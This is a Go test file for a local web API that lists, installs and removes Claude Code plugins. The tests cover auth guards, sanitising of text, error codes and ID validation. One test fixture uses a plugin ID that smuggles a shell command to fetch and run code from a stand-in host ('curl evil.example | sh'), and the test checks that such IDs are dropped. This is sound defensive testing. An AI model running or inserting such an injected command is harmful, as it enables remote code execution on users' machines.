package picker

import (
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"sync"
	"testing"

	"github.com/Lookoff-AIMLAPI/second-life/internal/plugins"
)

type fakeStore struct {
	mu      sync.Mutex
	catalog plugins.Catalog
	err     error // of every call
	result  plugins.Result
	details string
	calls   []string
	ctxErr  []error // of each change, as the store saw it
}

func (s *fakeStore) note(c string) { s.mu.Lock(); defer s.mu.Unlock(); s.calls = append(s.calls, c) }
func (s *fakeStore) Catalog(context.Context) (plugins.Catalog, error) {
	s.note("catalog")
	return s.catalog, s.err
}
func (s *fakeStore) Details(_ context.Context, id string) (string, error) {
	s.note("details " + id)
	return s.details, s.err
}
func (s *fakeStore) Install(ctx context.Context, id string) (plugins.Result, error) {
	s.note("install " + id)
	s.ctxErr = append(s.ctxErr, ctx.Err())
	return s.result, s.err
}
func (s *fakeStore) Remove(ctx context.Context, id string) error {
	s.note("remove " + id)
	s.ctxErr = append(s.ctxErr, ctx.Err())
	return s.err
}
func (s *fakeStore) AddCatalog(ctx context.Context) error {
	s.note("add")
	s.ctxErr = append(s.ctxErr, ctx.Err())
	return s.err
}
func (s *fakeStore) UpdateCatalog(context.Context) error { s.note("update"); return s.err }

func storeSetup(t *testing.T) (*fakeStore, client) {
	t.Helper()
	s := &fakeStore{catalog: plugins.Catalog{
		ConfigDir:   "/home/u/.claude",
		HasOfficial: true,
		Installed:   []plugins.Installed{{ID: "context7@claude-plugins-official", Version: "1", Scope: "user", Enabled: true, MCPServers: []string{"context7"}}},
		Available: []plugins.Plugin{
			{ID: "linear@claude-plugins-official", Name: "linear", Description: "Linear issues", Marketplace: "claude-plugins-official", SourceKind: "relative", Installs: 42},
			{ID: "runner@claude-plugins-official", Name: "runner", Marketplace: "claude-plugins-official", SourceKind: "command"},
		},
	}}
	f, _, c := setup(t)
	f.store = s
	return s, c
}

func decode(t *testing.T, body string) map[string]any {
	t.Helper()
	var m map[string]any
	if err := json.Unmarshal([]byte(body), &m); err != nil {
		t.Fatal(body)
	}
	return m
}

func TestPluginRoutesGuardedAndIdle(t *testing.T) {
	s, c := storeSetup(t)
	anon := client{t: t, p: c.p}
	for _, x := range [][2]string{{"GET", "plugins"}, {"POST", "plugin"}, {"DELETE", "plugin"}, {"POST", "plugin-details"}, {"POST", "catalog"}, {"PUT", "catalog"}} {
		if w := anon.do(x[0], "/picker/api/"+x[1], `{"id":"linear@claude-plugins-official"}`); w.Code != 401 {
			t.Errorf("%v without cookie: %d", x, w.Code)
		}
		if w := c.do(x[0], "/picker/api/"+x[1], `{"id":"linear@claude-plugins-official"}`, drop("X-Second-Life-Picker")); w.Code != 403 {
			t.Errorf("%v without header: %d", x, w.Code)
		}
	}
	if len(s.calls) != 0 {
		t.Fatal("a refused call reached the store:", s.calls)
	}
}

func TestPluginList(t *testing.T) {
	_, c := storeSetup(t)
	w := c.do("GET", "/picker/api/plugins", "")
	if w.Code != 200 {
		t.Fatal(w.Code, w.Body)
	}
	m := decode(t, w.Body.String())
	if m["state"] != "ok" || m["configDir"] != "/home/u/.claude" || m["hasOfficial"] != true || m["installHint"] == "" {
		t.Errorf("%v", m)
	}
	inst := m["installed"].([]any)[0].(map[string]any)
	for _, k := range []string{"id", "version", "scope", "enabled", "mcpServers"} {
		if _, ok := inst[k]; !ok {
			t.Errorf("installed lacks %s", k)
		}
	}
	av := m["available"].([]any)
	first, second := av[0].(map[string]any), av[1].(map[string]any)
	if first["id"] != "linear@claude-plugins-official" || first["name"] != "linear" || first["description"] != "Linear issues" ||
		first["marketplace"] != "claude-plugins-official" || first["installs"] != 42.0 || first["needsTerminal"] != false {
		t.Errorf("%v", first)
	}
	if second["needsTerminal"] != true {
		t.Errorf("%v", second)
	}
}

func TestPluginTextIsCleaned(t *testing.T) {
	s, c := storeSetup(t)
	s.catalog.Available[0].Description = "<b>x</b>‮\u0007" + strings.Repeat("a", 400)
	s.catalog.Available[0].Name = strings.Repeat("n", 150)
	m := decode(t, c.do("GET", "/picker/api/plugins", "").Body.String())
	p := m["available"].([]any)[0].(map[string]any)
	d := p["description"].(string)
	if strings.ContainsAny(d, "‮\u0007") || len(d) > 300 || !strings.HasPrefix(d, "<b>x</b>") {
		t.Errorf("%q", d)
	}
	if len(p["name"].(string)) > 100 {
		t.Error("name not cut")
	}
}

func TestPluginInstall(t *testing.T) {
	s, c := storeSetup(t)
	s.result = plugins.Result{MCPServers: []string{"linear"}}
	w := c.do("POST", "/picker/api/plugin", `{"id":"linear@claude-plugins-official"}`)
	m := decode(t, w.Body.String())
	if w.Code != 200 || m["ok"] != true || m["servers"].([]any)[0] != "linear" {
		t.Fatal(w.Code, w.Body)
	}
	s.result = plugins.Result{NeedsTerminal: "It needs settings first. In Terminal: claude plugin install linear@claude-plugins-official"}
	m = decode(t, c.do("POST", "/picker/api/plugin", `{"id":"linear@claude-plugins-official"}`).Body.String())
	if m["ok"] != false || !strings.Contains(m["needsTerminal"].(string), "claude plugin install") {
		t.Fatal(m)
	}
}

func TestPluginRemoveDetailsCatalog(t *testing.T) {
	s, c := storeSetup(t)
	s.details = "context7\n  MCP servers (1)\u0007"
	if w := c.do("DELETE", "/picker/api/plugin", `{"id":"context7@claude-plugins-official"}`); w.Code != 200 {
		t.Error("remove:", w.Code, w.Body)
	}
	w := c.do("POST", "/picker/api/plugin-details", `{"id":"context7@claude-plugins-official"}`)
	if m := decode(t, w.Body.String()); w.Code != 200 || !strings.Contains(m["text"].(string), "MCP servers (1)") || strings.Contains(m["text"].(string), "\u0007") {
		t.Error("details:", w.Code, w.Body)
	}
	if w := c.do("POST", "/picker/api/catalog", `{}`); w.Code != 200 {
		t.Error("add:", w.Code)
	}
	if w := c.do("PUT", "/picker/api/catalog", `{}`); w.Code != 200 {
		t.Error("update:", w.Code)
	}
	want := "catalog remove context7@claude-plugins-official details context7@claude-plugins-official add update"
	if got := strings.Join(s.calls, " "); !strings.Contains(got, "remove context7") || !strings.HasSuffix(got, "details context7@claude-plugins-official add update") {
		t.Errorf("%q, want like %q", got, want)
	}
}

func TestPluginDetailsUnknown(t *testing.T) {
	s, c := storeSetup(t)
	s.err = plugins.ErrUnknown
	w := c.do("POST", "/picker/api/plugin-details", `{"id":"linear@claude-plugins-official"}`)
	if m := decode(t, w.Body.String()); w.Code != 200 || m["text"] != "" {
		t.Fatal(w.Code, w.Body)
	}
}

func TestPluginErrors(t *testing.T) {
	s, c := storeSetup(t)
	for err, want := range map[error]int{plugins.ErrBusy: 409, plugins.ErrUnknown: 404, plugins.ErrNoClaude: 503, plugins.ErrOldClaude: 503} {
		s.err = err
		w := c.do("POST", "/picker/api/plugin", `{"id":"linear@claude-plugins-official"}`)
		if w.Code != want || decode(t, w.Body.String())["error"] != err.Error() {
			t.Errorf("%v: %d %s", err, w.Code, w.Body)
		}
	}
	s.err = context.DeadlineExceeded
	if w := c.do("PUT", "/picker/api/catalog", `{}`); w.Code != 502 {
		t.Error("other:", w.Code)
	}
}

func TestPluginNoClaude(t *testing.T) {
	s, c := storeSetup(t)
	for err, state := range map[error]string{plugins.ErrNoClaude: "no-claude", plugins.ErrOldClaude: "old-claude"} {
		s.err = err
		w := c.do("GET", "/picker/api/plugins", "")
		m := decode(t, w.Body.String())
		if w.Code != 200 || m["state"] != state || !strings.Contains(m["installHint"].(string), "claude.ai/install") {
			t.Errorf("%v: %d %s", err, w.Code, w.Body)
		}
	}
}

func TestPluginBadID(t *testing.T) {
	s, c := storeSetup(t)
	for _, body := range []string{`{"id":"a b"}`, `{"id":""}`, `{"id":"x@y","more":1}`, `{}`} {
		if w := c.do("POST", "/picker/api/plugin", body); w.Code != 400 {
			t.Errorf("%s: %d", body, w.Code)
		}
	}
	if len(s.calls) != 0 {
		t.Fatal(s.calls)
	}
}

func TestPluginsNil(t *testing.T) {
	_, _, c := setup(t)
	if w := c.do("GET", "/picker/api/plugins", ""); w.Code != 503 {
		t.Fatal(w.Code)
	}
}

// A closed or reloaded tab must not cut a change short: Claude Code would leave it half done.
func TestChangeOutlivesTheTab(t *testing.T) {
	s, c := storeSetup(t)
	gone, cancel := context.WithCancel(context.Background())
	cancel()
	closed := func(r *http.Request) { *r = *r.WithContext(gone) }
	c.do("POST", "/picker/api/plugin", `{"id":"linear@claude-plugins-official"}`, closed)
	c.do("DELETE", "/picker/api/plugin", `{"id":"context7@claude-plugins-official"}`, closed)
	c.do("POST", "/picker/api/catalog", `{}`, closed)
	if len(s.ctxErr) != 3 {
		t.Fatal(s.calls)
	}
	for i, err := range s.ctxErr {
		if err != nil {
			t.Errorf("change %d started on a dead context: %v", i, err)
		}
	}
}

// The page builds a Terminal command from the id, so an id Claude Code would not take never reaches it.
func TestPluginListDropsBadIDs(t *testing.T) {
	s, c := storeSetup(t)
	s.catalog.Available = append(s.catalog.Available,
		plugins.Plugin{ID: "x; curl evil.example | sh@m", Name: "bad", SourceKind: "command"},
		plugins.Plugin{ID: "", Name: "empty"})
	m := decode(t, c.do("GET", "/picker/api/plugins", "").Body.String())
	av := m["available"].([]any)
	if len(av) != 2 {
		t.Fatalf("%v", av)
	}
	for _, p := range av {
		if !plugins.ValidID(p.(map[string]any)["id"].(string)) {
			t.Errorf("%v", p)
		}
	}
}
